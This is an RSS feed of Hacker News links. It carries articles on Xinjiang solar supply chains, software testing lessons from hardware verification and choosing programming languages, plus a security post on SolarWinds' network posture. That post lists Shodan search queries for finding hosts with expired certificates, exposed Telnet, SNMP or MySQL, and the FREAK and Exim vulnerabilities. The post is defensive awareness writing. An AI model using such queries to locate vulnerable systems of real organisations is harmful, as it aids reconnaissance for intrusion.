https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-333x200.jpg 333w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1120x672.jpg 1120w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-600x360.jpg 600w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1320x792.jpg 1320w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231.jpg 1979w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>A Meyer Burger engineer working on solar cells at a company site in Germany | Detlev Müller/Meyer Burger</figcaption></figure>



<p>The Commission is working on <a href="https://www.politico.eu/?p=1496802">a new tool</a> — due diligence legislation — which would make EU companies accountable if their suppliers breach labor and climate laws. But MEPs would like the Commission to go even further to tackle serious situations such as the one in Xinjiang. Last month, the European Parliament’s legal affairs committee <a href="https://www.politico.eu/?p=1590418">called on</a> the Commission to introduce an import ban for “products related to severe human rights violations.”</p>



<p>“The EU due diligence legislation has a key role to play in that as it will help ensure that human rights are respected throughout our supply chains,” said MEP Cavazzini. She backs an import ban if suppliers are shown to be involved in human rights abuses.</p>



<p>The Commission is <a href="https://ec.europa.eu/info/law/better-regulation/have-your-say/initiatives/12548-Sustainable-corporate-governance" target="_blank">set to</a> come up with its supply chain responsibility proposal by June after a public consultation ended this week.</p>



<p>According to Justice Commissioner Didier Reynders, who is in charge of the file, new rules are likely to focus on so-called Tier 1 suppliers and to make reference to the International Labor Organization’s core conventions, which China committed to ratify under the new investment deal concluded with the EU.</p>



<p>“Expanding the use of renewables is of utmost importance in order to stop the climate crisis. But it cannot come at the cost of human rights,” said Cavazzini.</p>



<p><em>Want more analysis from </em><span>POLITICO</span><em>? </em><span>POLITICO</span><em> Pro is our premium intelligence service for professionals. From financial services to trade, technology, cybersecurity and more, Pro delivers real time intelligence, deep insight and breaking scoops you need to keep one step ahead. Email <a href="https://www.politico.eu/cdn-cgi/l/email-protection#83f3f1ecc3f3ecefeaf7eae0ecade6f6" target="_blank"><span data-cfemail="90e0e2ffd0e0fffcf9e4f9f3ffbef5e5">[email&nbsp;protected]</span></a> to request a complimentary trial.</em></p>
								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/xinjiang-china-polysilicon-solar-energy-europe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119752</guid>
            <pubDate>Fri, 12 Feb 2021 23:21:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rethinking Software Testing: Perspectives from the World of Hardware]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26119482">thread link</a>) | @whack
<br/>
February 12, 2021 | https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		




<p>The hardware and software worlds may seem poles apart, and in many ways, they indeed are. But there’s a wealth of knowledge that each can learn from the other. Despite the seemingly massive differences in the final product, they share more in common than you might expect. </p>



<p>Computer engineers at places like Intel, just like software engineers, spend most of their time sitting at their desks, writing (verilog) code that implements the desired system behavior. They then compile (synthesize) their code in order to generate lower-level outputs (digital circuits and physical layouts). And finally, they write automated tests that exercise their <a href="https://en.wikipedia.org/wiki/System_under_test" target="_blank" rel="noreferrer noopener">SUT</a>, to ensure that the code is functionally correct. Sound familiar?</p>



<p>I know all this intimately, given my own past as a hardware engineer, and my later transition into software development. After finishing my Master’s degree in Computer Architecture, I spent over 5 years working at Intel and Sun as a Hardware Verification engineer, before turning down a senior-staff role at Apple, in order to reboot my career as a software developer.</p>



<p>In the past 5 years, I’ve worked in some great software teams at places like Google, and have also led development for multiple personal projects in my free time. The programmers that I’ve met and worked with are undoubtedly smart, and possess a number of skills that my hardware colleagues should strive to emulate. However, one thing I’ve noticed is that when it comes to testing, their instincts have been… off. Way off. </p>



<p>Here’s my attempt to distill the lessons I’ve learnt from my Hardware days, and how they can be applied to improve our Software testing methodologies and outcomes.</p>



<p><em>Disclaimer: this post is focused on non-UI programming, where functionality can be 100% covered without the need for “eyeballing”. Front-end/UI testing is a whole other beast that I wouldn’t comment on or touch with a ten foot pole.</em></p>







<p>The elephant in the room in most software companies, is the perceived importance of testing. In hardware, <a rel="noreferrer noopener" href="https://anysilicon.com/verification-validation-testing-asicsoc-designs-differences/" target="_blank">pre-silicon verification</a> is a first-class citizen in the development process. Dedicated verification engineers earn 6 figure salaries, sit next to their RTL design counterparts in all planning meetings, and enjoy careers that are just as prestigious and lucrative. In comparison, at most software companies I’ve come across, testing is treated as a 2nd class citizen – being a “test engineer” (or worse, “tester”) is often maligned as being less prestigious or lucrative.</p>



<p>This difference in culture isn’t an accident of nature. It’s a natural consequence of the much higher stakes in the hardware world. Because the <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Tape-out" target="_blank">tapeout</a> process is so expensive and time consuming, finding even a single bug can delay your product launch by months, and cost you millions of dollars in additional expenses. Or worse: finding a bug after your customers have already purchased and installed the chips, can result in <a href="https://en.wikipedia.org/wiki/Pentium_FDIV_bug" target="_blank" rel="noreferrer noopener" aria-label="extremely expensive product recalls (opens in a new tab)">extremely expensive product recalls</a>. Even if the fix is a simple one-line code change.</p>



<p>The consequences of software bugs can certainly be disastrous. But at least the fix is extremely cheap logistically – code deployments and software patches are vastly faster and cheaper than manufacturing and distributing new silicon. Hence why hardware organizations take testing much more seriously than comparable software companies.</p>



<p>The results do speak for themselves. Hardware products that are in the hands of customers, have an order-of-magnitude fewer bugs. The percentage of bugs that are caught prior to release, is vastly higher in the hardware industry as compared to the software industry.</p>



<h4>A Better Way</h4>



<p>It is tempting to say that hardware teams are better at testing, purely because of their greater financial investment. That software teams are already operating at their most ideal, and that improvements in testing-quality can only be had through sacrifices in time/cost. </p>



<p>Such a view is unjustifiably optimistic about the current state of affairs, and pessimistic about our potential for improvement. Over the past decades we have vastly improved our software-development practices and methodologies. There’s no reason to believe that we have now achieved a state of nirvana where no further improvements are possible.</p>



<p>Even though many programmers tend to short change it, testing-methodology is itself a skill set. One that is learned over time by an entire industry, at a rate proportional to its level of investment. And in this sense, the hardware industry is miles ahead when it comes to testing best-practices. Not because they are “smarter” in any way, but simply because their survival depends on it.</p>



<p>You wouldn’t expect a football player to be able to jump as high as a basketball player.<br>You wouldn’t expect a restaurant to take cleanliness as seriously as a hospital.<br>You definitely shouldn’t expect a software organization to master testing best-practices, the way a hardware company has.</p>



<p>If you want to master the art of testing, talk to a hardware verification engineer.</p>







<h2>The 0th Law of Testing: Only the Paranoid Survive</h2>



<p>If it hasn’t been tested, it doesn’t work. <em><a rel="noreferrer noopener" aria-label="“If this isn't absolutely true, it is certainly a good working assumption for project work.” (opens in a new tab)" href="http://www.hyperthot.com/pm_princ.htm" target="_blank">“If this isn’t absolutely true, it is certainly a good working assumption for project work.” </a></em>This rule forms the foundation for most other lessons listed here.</p>



<p>Word of Warning: The universe of all possible inputs and corner-cases is infinite. Hence, you will never attain 100% coverage via empirical testing. You will never cross the finish-line. If you ever think that you are “done” with testing, you’re in for a surprise. All you can do is chase as much coverage as can be attained, with the amount of time and resources available.</p>



<h2>Manual Testing is not good enough</h2>



<p>Things I’ve heard developers say:</p>



<p><em>“This is so important, that we have to test it manually. I don’t trust an automated test to do the job.”</em><br><em>“Don’t worry about trying to build automated tests. We’ve been manually testing these changes.”</em></p>



<p>What a Hardware engineer would say instead:</p>



<p><em>“This is so important, that we have to build an automated test suite for it. I don’t trust human testers to do the job.”</em><br><em>“Maybe run a few tests manually as a final sanity check, but don’t spend too much time since it’s been auto-tested pretty well.”</em></p>



<p>Running a couple tests by hand and eyeballing the results, might work in a college VLSI class. But it’s going to get you laughed at in industry. Manual testing cannot be code-reviewed on GitHub. Manual testing is subject to human error, whether due to oversight or laziness. Manual testing is extremely time and labor intensive, when subjected to every single release.</p>



<p>There might be specific exceptions where a test cannot be automated. But these should be the exception – not the norm. Reliability ultimately comes from the strength of your automated test suite, not how much manual testing you’re doing. Anything important enough to test by hand, is important enough to build an automated test suite for.</p>



<h2><strong>Testing Two Inputs in Isolation != Testing Them Together</strong></h2>



<figure><div>

</div></figure>



<p>Suppose your team is implementing and testing the following method:</p>


<pre title="">public static double myCustomDivider(double numerator, double divisor);
</pre>


<p>Alice:<em> “Do we have tests checking correct behavior for negative inputs?”</em><br>Bob:<em> “I have a test where the numerator is negative, and another test where the divisor is negative”</em><br>Alice: <em>“Do you have a 3rd test where they are both negative?”</em><br>Bob: <em>“No, and we don’t need that. We’ve already covered both cases individually.”</em></p>



<p>You laugh, but I’ve heard variations of this said far too many times, by far too many senior developers.</p>



<p>If the 2 inputs are completely decoupled, maybe it makes sense to assume we don’t need to test them in combination. But often times, 2 inputs which are assumed to be decoupled, aren’t nearly as decoupled as people think. And even if the implementation is indeed decoupled at the time of writing the test, it can often evolve to become coupled at a later time. As the saying goes: <em>“It ain’t what you don’t know that gets you into trouble. It’s what you know for sure that just ain’t so.”</em></p>



<p>As a general heuristic: If 2 inputs are both being parsed within the same method, there is definitely value in testing them in combination.</p>



<p>Perhaps you’ve decided that the risk-reward tradeoff merits not writing tests to cover some combinations. This is certainly a reasonable decision to make, depending on the particular project circumstances and the events being considered. But do so cognizant of the risk you’re taking on. Do not delude yourself into thinking that there’s no value in testing combinations of multiple events.</p>



<h2>Testing Output_A for Event_1 != Testing Output_A for Event_2</h2>



<p>Suppose you find yourself needing to test the following addPerson method:</p>


<pre title="">public int getAge(String name);
public int getHeight(String name);
public int getWeight(String name);

// Returns true if a previous value was overwritten
public boolean addPerson(Person person);
</pre>


<p>And so you write the following tests:</p>


<pre title="">@Test
public void addNewPerson_shouldReturnFalse() {
  Person person = new Person("john", 30, 175, 70);
  boolean result = system.addPerson(person);
  Truth.assertThat(result).isFalse();
  getAndCheckPerson(person);
}

@Test
public void addPerson_alreadyExists_shouldReturnTrue() {
  Person originalJohn = new Person("john", 30, 175, 70);
  system.addPerson(originalJohn);

  Person updatedJohn = new Person("john", 31, 174, 71);
  boolean result = system.addPerson(updatedJohn);

  Truth.assertThat(result).isTrue();
  getAndCheckPerson(updatedJohn);
}

private void getAndCheckPerson(Person person) {
  Truth.assertThat(system.getAge(person.name))
    .isEqualTo(person.age);
  Truth.assertThat(system.getHeight(person.name))
    .isEqualTo(person.height); 
  Truth.assertThat(system.getWeight(person.name))
    .isEqualTo(person.weight);
}
</pre>


<p>The following conversation then ensues.<br>John: <em>“Hey, why are you checking the age/height/weight all over again in the …</em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/">https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/</a></em></p>]]>
            </description>
            <link>https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119482</guid>
            <pubDate>Fri, 12 Feb 2021 22:51:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calvin and Hobbes Search Engine]]>
            </title>
            <description>
<![CDATA[
Score 322 | Comments 122 (<a href="https://news.ycombinator.com/item?id=26119380">thread link</a>) | @bookofjoe
<br/>
February 12, 2021 | http://michaelyingling.com/random/calvin_and_hobbes/ | <a href="https://web.archive.org/web/*/http://michaelyingling.com/random/calvin_and_hobbes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://michaelyingling.com/random/calvin_and_hobbes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119380</guid>
            <pubDate>Fri, 12 Feb 2021 22:40:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anyone can control the lights in my kitchen over the Internet]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26119075">thread link</a>) | @sysrpl
<br/>
February 12, 2021 | https://www.codebot.org/articles/?doc=9633 | <a href="https://web.archive.org/web/*/https://www.codebot.org/articles/?doc=9633">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.codebot.org/articles/?doc=9633</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119075</guid>
            <pubDate>Fri, 12 Feb 2021 22:04:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Questions to Ask When Choosing a Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26118921">thread link</a>) | @ingve
<br/>
February 12, 2021 | https://shekhargulati.com/2021/02/12/questions-to-ask-when-choosing-a-programming-language/ | <a href="https://web.archive.org/web/*/https://shekhargulati.com/2021/02/12/questions-to-ask-when-choosing-a-programming-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-6502">
	<!-- .entry-header -->

	
	
	<div>
		
<p>This week I had a discussion with one of my friends on how to choose a programming language. It was triggered by multiple discussions I had with our customers on their engineering strategy in the last six months and one question that came multiple times was should we use X programming language for our new initiatives. Some customers were thinking of moving from .NET stack to Java, some banks were thinking about moving to Golang because their technical leaders have watched Monzo talks on Golang, for some it was from Java to Kotlin, and some were thinking of dumping JavaScript for Typescript.</p>



<p>To come up with the answer I try to find answers to following questions in context of the organization:</p>



<ul><li>What is the maturity of the programming language with respect to its community and ecosystem? Should they spend their one innovation token on this language?</li><li>How easy it is to find available talent in the market for that programming language?&nbsp;</li><li>How easy it is for the organization to acquire production engineering know-how for a programming language?</li><li>What are the productivity and efficiency gains that can be achieved from using a programming language? Are those gains aligned with the organization goals?</li><li>What are the use-cases an organization wants to solve with the programming language?</li><li>What is the future of a programming language? For a big enterprise it is important if the language can last for a decade.</li><li>What is the learning curve of the programming language? Can existing staff be upskilled?</li></ul>



<p>There is no correct answer to these questions. Most engineering organizations will end up using multiple programming languages. For example an organization may choose Golang as a general purpose language to build backend services, Python for scripting and data related work, Typescript for building web frontend. It is also possible that an engineering organization might choose Python for building most services and for few where performance and efficiency is important it chooses Golang. I think the important point is defining a small list of programming languages for the organization and documenting when you will choose which programming language.&nbsp;</p>



<p>I use a decision matrix like the one shown below to come up with one possible answer. Depending on which factors are important to the organization they can give them weights and that will impact the score of the language. In the image shown below, language 1 is the winner.</p>



<figure><img src="https://lh6.googleusercontent.com/WGB2gGPDUN24IZXig5kZSGzKwcpwSIfP5dzPMp5gxTpIGw5g5rRlqcsWPSTYDY0QWf6U0D14oL9dfTeRZlDanEwK54XjJIirmMeIGTL62skChi8YxVTBZcpeJyRbnveFCKYW3d7U" alt=""></figure>



<p>As I was writing this post a few more questions came to my mind.&nbsp;</p>



<ul><li>Does a programming language help us write less buggy software?</li><li>Does a programming language have some constructs that help us reduce the essential complexity of the system?</li><li>What constraints does a programming language impose and how do they impact the business goals?</li><li>Can a programming language be a competitive advantage for an organization?</li><li>Can a programming language influence the quality of the development team, the quality of code, and practices they follow?</li><li>Does a programming language influence engineering organization culture?</li><li>Can a programming language over time help average Joe become a good software engineer?</li><li>What makes a programming language future safe? Can we predict it to safeguard us?</li><li>Should a language choice depend on NFRs that you want to achieve?</li><li>How does a programming language influence behavior of a team?</li></ul>



<p>I don’t have answers to all of the above mentioned questions. I am hoping there is academic research done on the above but I am yet to read those papers.</p>



<p>I did some research on why different organizations choose certain languages and I found the following key points.</p>



<ol><li>Gitlab – Ruby – <a href="https://about.gitlab.com/blog/2018/10/29/why-we-use-rails-to-build-gitlab/">Link</a><ul><li>GitHub, a source of inspiration for GitLab, was also based on Rails, making it a logical pick considering his interest in the framework.</li><li>Ruby on Rails ecosystem allows you to shape a lot of functionality at a high quality</li><li>We need a lot of functionality and Ruby on Rails is a way to do it</li><li>Consistent coding practices. You are guided to do the right thing.</li><li>Big community of Ruby gems</li></ul></li><li>CockroachDB – Golang – <a href="https://www.cockroachlabs.com/blog/why-go-was-the-right-choice-for-cockroachdb/">Link</a><ul><li>its support for libraries, interfaces, and tooling positioned it as the right choice for CockroachDB</li><li>Go was designed to scale to large code bases with an emphasis on simplicity and orthogonality of features. The enforced code style, the simple imports and automated import management, the wide variety of linters, the straightforward (and minimal) set of programmatic idioms…all of these attributes of Go are important for clean, understandable code.</li><li>When comparing to Java, we appreciate the tight focus on implementation instead of OOP and abstraction: interfaces can be added when needed, not as an initial, often unnecessary, step.&nbsp;</li><li>When comparing to C++, we appreciate automatic memory management and how there’s rarely more than one way to get something done, for example with static and one-time initializers.</li><li>Go gives better control over memory allocation that impacts garbage collection.</li></ul></li><li>Asana – TypeScript – <a href="https://blog.asana.com/2014/11/asana-switching-typescript/">Link</a><ul><li>Clean JS</li><li>Community Support</li><li>Errors at compile time instead of runtime</li><li>Static typing</li></ul></li><li>American Express – Golang – <a href="https://go.dev/solutions/americanexpress/">Link</a> and <a href="https://americanexpress.io/choosing-go/">Link</a><ul><li>For their assessment, they chose to build a microservice in four different programming languages. They then compared the four languages for speed/performance, tooling, testing, and ease of development.</li><li>While Go may not have been the fastest language tested, its powerful tooling helped bolster its overall results. Go’s built-in testing framework, profiling capabilities, and benchmarking tools impressed the team.</li><li>Reasons<ul><li>Simple and straightforward</li><li>Encourage best practices</li><li>Concurrency</li><li>Tooling</li></ul></li></ul></li><li>Nubank – Clojure – <a href="https://building.nubank.com.br/working-with-clojure-at-nubank/">Link</a><ul><li>Nubank provides services in the finance domain, which is very close to mathematical functions — and functional programming is an excellent fit for both scenarios.</li><li>Clojure, on the other hand, has simple constructs that allow us to focus on the problem we are solving, making evolving the system a small incremental challenge, which doesn’t get that much harder over time.</li><li>Most of our codebase can be understood locally, looking at any given pure function, understanding its outputs for any given set of inputs. There’s rarely any need to reason about or recreate the internal state of objects. Data moves through the system in a composable, inspectable, consistent, and immutable way (without hiding it inside of objects).</li><li>Functional code is much easier to test, and that gives us the confidence to deploy an average of over 50 changes per day in a mission-critical domain.</li><li>Nubank has acquired Cognitect, the US-based software consultancy behind the Clojure programming language and the Datomic database</li></ul></li><li>Janestreet – Ocaml – <a href="https://www.youtube.com/watch?v=v1CmGbOGb2I">Link</a> , <a href="https://queue.acm.org/detail.cfm?id=2038036">Link</a> , and <a href="https://discuss.ocaml.org/t/does-jane-street-use-other-programming-languages-aside-from-ocaml/2761/5">Link</a><ul><li>Brevity of the language and the powerful type system that makes OCaml code very readable</li><li>Powerful abstraction capabilities that reduce boilerplates</li><li>Static type system for ensuring code correctness</li><li>He spoke about some of the fancy type tricks like parametric polymorphism, algebraic data types, type inference, phantom types and type indexed values that add to the expressivity of code.</li><li>Also OCaml hits the sweet spot between expressiveness of code and the performance numbers. The very much tunable GC makes things easier to control.</li></ul></li><li>Starling Bank – Java – <a href="https://www.infoq.com/presentations/starling-bank/">Link</a><ul><li>Exceptions are noisy and difficult to ignore</li><li>Reliable ecosystem (user base, tooling, job market, etc)&nbsp;</li><li>Integrations with legacy third parties (SOAP etc)</li></ul></li><li>KhanAcademy – Golang – <a href="https://blog.khanacademy.org/go-services-one-goliath-project/">Link</a><ul><li>Kotlin was more performant</li><li>Golang used much less memory</li></ul></li><li>Lyft – TypeScript – <a href="https://eng.lyft.com/typescript-at-lyft-64f0702346ea">Link</a><ul><li>Popularity</li><li>Type safety</li><li>Less Bugs</li><li>Productivity</li></ul></li><li>Medium – Golang – <a href="https://medium.engineering/rex-mediums-go-recommendation-microservice-e077bc9582a">Link</a><ul><li>More efficient use of the CPU. While Node is single-threaded, Go is much better suited for the combination of I/O and CPU-intensive operations required to build a ranked feed. Splitting our work onto separate Goroutines means we can avoid the issue of the CPU getting hogged by one single request and other requests getting starved.</li><li>Opinionated. Go makes it pretty hard to write “bad” code. A typed language that is also highly opinionated in terms of code styling means that even a newbie to Go (which I was when we started writing Rex) can quickly start writing clean and readable code.</li><li>Prior experience with Go. While much of Medium’s codebase is written in Node, we already had a few smaller-purpose microservices in Go. Adding another microservice in a language that we as a company have familiarity with makes building and maintaining this new service much easier.</li></ul></li><li>Instagram – Python – <a href="https://instagram-engineering.com/web-service-efficiency-at-instagram-with-python-4976d078e366">Link</a><ul><li>Simplicity</li><li>Practicality</li></ul></li></ol>



<p>I hope this post helps you understand that there is much more to choosing a programming language.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://shekhargulati.com/2021/02/12/questions-to-ask-when-choosing-a-programming-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118921</guid>
            <pubDate>Fri, 12 Feb 2021 21:46:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SolarWinds: Going beyond attribution – all in a day’s work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26118736">thread link</a>) | @Sami_Lehtinen
<br/>
February 12, 2021 | https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/ | <a href="https://web.archive.org/web/*/https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cms-source="/_layouts/blog.html" data-cms-index="0">
          
          <p>February 12, 2021</p>

<p>Monty Python’s “Bicycle Repair Man” is a fitting allegory for the information security industry. It is filled with supermen and -women who fight bad guys with their super powers, such as threat hunting, attribution and TTPs. The big question however is, are enough of us looking after our own infrastructure, our “bicycles”?</p>

<p>The SolarWinds case is no different, as in the heat of the moment everybody is focused on attributing the malice and all things related. My position is that in addition, we should also pay attention to what may have led into this situation, which oftentimes simply is poor security posture due to a failure in people, processes or technology.&nbsp;</p>

<p>Even more precisely, the crux of the problem often lies in poor IT processes related to patching, access control or other “boring stuff”, such as keeping X.509 certificates from expiring.</p>

<h2 id="how-dare-you-say-that-out-loud">How dare you say that out loud?</h2>

<p>Simply, because for more than a decade I’ve been helping people in their mission to reduce incidence of suspected compromise, publicly exposed vulnerable services or open services which may be unintentionally exposed to the Internet - at nation scale and through automation.</p>



<p>SolarWinds is a company, whose mission is to make the IT administration simpler and more secure at scale. This is a great mission and I fault the company not with what they have built or how secure their products are.</p>

<p>The challenge seems to be the fact how well they have their own people, processes and technology in line with what they enable their customers to achieve through their products.</p>

<h2 id="can-you-show-me-the-proof">Can you show me the proof?</h2>

<p>Yes, as the proof is in the open for everyone to see. Look at their publicly available network assets and connect the dots between the assets and known vulnerabilities observed through Shodan. I did this with the help of our research into 86 specific known and vetted issues on Shodan and matched the data against the SolarWinds assets and the picture is quite clear and unflattering.</p>

<h2 id="why-are-you-singling-them-out">Why are you singling them out?</h2>

<p>Their case is actual and well known and if a tragedy on such a scale can contribute to the common good, then we should seize the opportunity. On 2021-01-12, we reached out to SolarWinds to confirm that the network assets we used for the evaluation actually belong to them. We even offered them the findings to help them mitigate them. Unfortunately, they did not respond to our requests and we are now publishing our results in this blog post.</p>

<p>Given the constraints I lay out below, they clearly have not done their due diligence and as a result we have this mess, where threat actors must have had a field day in gaining initial access to the company - no zero days needed.</p>

<p>I implore you to reflect that in addition to threat signatures and TTPs about the malice, we need to start looking at the security posture of organizations as well - and not just after a high profile breach such as this one. The information I present below after all, is public and most likely used by threat actors every single day.</p>

<p>Furthermore, the vulnerabilities I detail below, plague most organizations on the Internet. Picking three prominent US defense contractors at random, I found most of the same issues related to their network assets as well, namely General Dynamics, Harris Corporation or Northrop Grumman.</p>

<h2 id="so-whats-the-evidence">So what’s the evidence?</h2>

<p>As stated above, I used the 86 vetted queries from Shodan against the publicly available network asset information related to SolarWinds. In essence, I used the same approach as the cyber rating companies do, which means that they rely in large part on publicly available IP network registration information when producing their ratings of you.</p>

<p>To be reproducible, the uncertainties related to the interpretation of the results must at least account for the following four things:</p>

<ol>
  <li>That the network asset in question belongs to the right party, which in this case study should be SolarWinds.</li>
  <li>That the service in question may be honeypot, whose intention is to monitor for scanning and/or exploitation of the emulated service.</li>
  <li>That the service implementation based version matching suffers from patch backporting, which means that the detection or assessment method cannot solely rely on a simple version banner.</li>
  <li>That the party doing the interpretation has to be able to understand the impact, as just having all the Shodan matches against a network asset alone makes interpretation difficult in practice.</li>
</ol>

<h2 id="what-are-the-observations-then">What are the observations then?</h2>

<p>In this case, I used evidence from the last 6 months mapped against the publicly available network asset attributable to SolarWinds. Mapping the 86 topics against those assets with automation, I was able to detect seven distinct vulnerabilities in their infrastructure, as follows:</p>

<p><img src="https://d1qmdf3vop2l07.cloudfront.net/swell-rail.cloudvent.net/hash-store/0f84f98834724a9d07eea6fba20806d4.png" alt="" width="1390" height="532" data-cms-original-src="/images/content/image1-1.png"></p>

<h4 id="expired-x509">Expired X.509</h4>

<p>If you have ever done systems administration of any type of Internet facing services, you have battled against time and expiration of X.509 certificates, which prove the identity of your service to its users. You’re probably thinking right now that wait, we should be talking about vulnerabilities, about CVEs, right? Remote code execution, the sexy stuff. My favorite retort to that is the following: the Equifax data breach which exposed the PII of 147 million people was largely caused by expired X.509 certificates in critical monitoring systems.&nbsp;</p>

<p>shodan dork: ssl.cert.expired:true&nbsp;</p>

<p>ref: <a href="https://www.csoonline.com/article/3444488/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html">https://www.csoonline.com/article/3444488/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html</a></p>

<h4 id="sslv2">SSLv2&nbsp;</h4>

<p>The arms race against crypt analysis has accelerated over the past couple of years. This means that cryptographic hashes or ciphers perfectly acceptable five years ago have become obsolete. SSL version 2 is a cryptographic protocol, which hasn’t met the requirement for Internet facing services for even longer. Its use was prohibited by RFC 6167 in 2011.&nbsp;</p>

<p>shodan dork: ssl.version:sslv2&nbsp;</p>

<p>ref: <a href="https://tools.ietf.org/html/rfc6176">https://tools.ietf.org/html/rfc6176&nbsp;</a></p>

<h4 id="exposed-snmp">Exposed SNMP&nbsp;</h4>

<p>Simple Network Management Protocol is very handy for gathering low-level information about networked devices and their status, especially in the switch and router space. As demonstrated by OUSPG PROTOS project in 2002, SNMP, whatever the version, is not and will not be a protocol fit for the Internet. Access to SNMP implementations must be access controlled to those devices, which are under your control, no matter which version of the protocol the device is speaking. Google “c06-snmp test suite” and assess the ramifications yourself, if you need more background on the issue. Moreover, threat actors have abused SNMP for reflected DDoS attacks for years, since sending a single spoofed UDP packet with the source address of the target will yield a huge amplification factor to their DDoS traffic.</p>

<p>shodan dork: port:161</p>

<p>shodan dork: port:161 snmp&nbsp;&nbsp;</p>

<p>ref: <a href="https://en.wikipedia.org/wiki/Oulu_University_Secure_Programming_Group">https://en.wikipedia.org/wiki/Oulu_University_Secure_Programming_Group</a>&nbsp;</p>

<h4 id="exposed-telnet">Exposed Telnet&nbsp;</h4>

<p>Before the advent of SSH, telnet was the de facto protocol for remote management or shell access to systems or devices. In 1995, a Finnish engineer called Tatu Ylönen invented SSH, which made the telnet obsolete overnight. 25 years later, however, telnet is still going strong for some reason. There simply is not any Internet facing use case for the service, period.&nbsp;</p>

<p>shodan dork: port:23</p>

<p>shodan dork: telnet</p>

<p>ref: <a href="https://en.wikipedia.org/wiki/Telnet">https://en.wikipedia.org/wiki/Telnet</a>&nbsp;</p>

<h4 id="exposed-mysql">Exposed MySQL&nbsp;</h4>

<p>Even if MySQL database engine is the de facto component as a backend service for many an Internet facing service, exposing it directly to the Internet without any further access control in front of it is inviting disaster. Recently, there was a major data breach in Finland, which allegedly resulted from the database backend being directly exposed to the Internet without any further access control in front of it. Layered security is not just a fancy buzz word. In many cases the database backend doesn’t even need to be reachable over the network at all, but when it does, access to it must be locked down to only those hosts, which actually need it.</p>

<p>shodan dork: product:”MySQL”&nbsp;</p>

<p>ref: <a href="https://vpsie.com/knowledge-base/securing-mysql-database-shared-hosting-environment/">https://vpsie.com/knowledge-base/securing-mysql-database-shared-hosting-environment/</a>&nbsp;</p>

<h4 id="cve-2015-0204-aka-freak">CVE-2015-0204 a.k.a. FREAK</h4>

<p>Compliance with US cryptographic export controls lies at the heart of this vulnerability. An Internet facing service simply should not support negotiation of an encrypted connection, which is possible to decipher using $100 worth of cloud computing resources. We could even rename this vulnerability, man-in-the-middle made easy.</p>

<p>shodan dork: vuln:CVE-2015-0204&nbsp;</p>

<p>ref: <a href="https://en.wikipedia.org/wiki/FREAK">https://en.wikipedia.org/wiki/FREAK</a></p>

<p>ref: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0204">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0204</a></p>

<h4 id="cve-2019-10149">CVE-2019-10149&nbsp;</h4>

<p>Exim is a popular Mail Transfer Agent, MTA, used in many mostly linux-based servers. It has had a mottled history with information security and in 2019, a serious flaw was discovered in it, which leads to remote code execution. Please note that using this dork especially, one must understand the implication of backporting security fixes and how they are reflected in the version banner.&nbsp;</p>

<p>shodan dork: vuln:CVE-2019-10149</p>

<p>ref: <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10149">https://nvd.nist.gov/vuln/detail/CVE-2019-10149</a></p>

<h2 id="conclusions">Conclusions</h2>

<p>I know maintaining and repairing “bicycles” is tedious. This work, however, is the thing that will keep you safer and make it more difficult for the threat actors to attack you. I’m not saying that the threat actor’s initial access in the case of SolarWinds could’ve been prevented by addressing the specific issues I highlighted above, but it would’ve made it more difficult.</p>

<p>Building security in and making it layered is the only foundation you can build on that gives you predictability in a much more coherent way than investing in the magic security technology X that exploits the hype of the day. Building security in, means investing in people and processes as well.</p>

